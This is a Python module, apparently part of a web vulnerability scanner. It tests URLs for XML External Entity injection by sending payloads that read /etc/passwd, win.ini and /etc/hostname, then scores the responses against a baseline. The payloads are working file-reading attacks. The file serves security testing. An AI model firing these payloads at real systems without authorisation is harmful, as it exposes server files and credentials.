"""
XML External Entity (XXE) Injection Scanner.

Tests for XXE by injecting malicious XML entities that attempt to
read local files. Uses confidence scoring with baseline comparison.
"""

from core.http_client import get, post
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params

# XXE payloads targeting /etc/passwd (Linux) and win.ini (Windows)
XXE_PAYLOADS_POST = [
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>',
        ["root:x:0:0", "daemon:x:"],
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root><data>&xxe;</data></root>',
        ["[extensions]", "[fonts]"],
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
        '<root><data>&xxe;</data></root>',
        [],  # Any non-baseline content change
    ),
]

XXE_PARAM_PAYLOADS = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        ["root:x:0:0"],
    ),
]


def test_xml_injection(url):
    baseline = get_baseline(url, get)

    # ── 1. POST-based XXE (send XML body) ──
    for payload, indicators in XXE_PAYLOADS_POST:
        try:
            headers = {"Content-Type": "application/xml"}
            r = post(url, data=payload, headers=headers)

            waf_blocked, _ = detect_waf_block(r)
            if waf_blocked:
                continue

            text_lower = r.text.lower()
            signals = {}
            evidence = ""

            for ind in indicators:
                ind_lower = ind.lower()
                if ind_lower in text_lower and ind_lower not in baseline["text_lower"]:
                    signals["file_content"] = True
                    evidence = ind
                    break

            # Also check if response changed significantly (entity was processed)
            sim = diff_responses(baseline["text"], r.text)
            signals["response_diff"] = sim < ScannerConfig.DIFF_THRESHOLD

            confidence = calculate_confidence(signals)
            if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                return make_finding(
                    url, "XML External Entity (XXE) Injection", confidence, signals,
                    details=f"XXE entity resolved: '{evidence}'",
                    severity="Critical", payload=payload[:80],
                    evidence=evidence,
                )
        except Exception:
            continue

    # ── 2. Parameter-based XXE ──
    for payload, indicators in XXE_PARAM_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    ind_lower = ind.lower()
                    if ind_lower in text_lower and ind_lower not in baseline["text_lower"]:
                        signals["file_content"] = True
                        evidence = ind
                        break

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "XML External Entity (XXE) Injection", confidence, signals,
                        details=f"XXE via param '{param}'",
                        severity="Critical", payload=payload[:80],
                        evidence=evidence, parameter=param,
                    )
            except Exception:
                continue

    return None
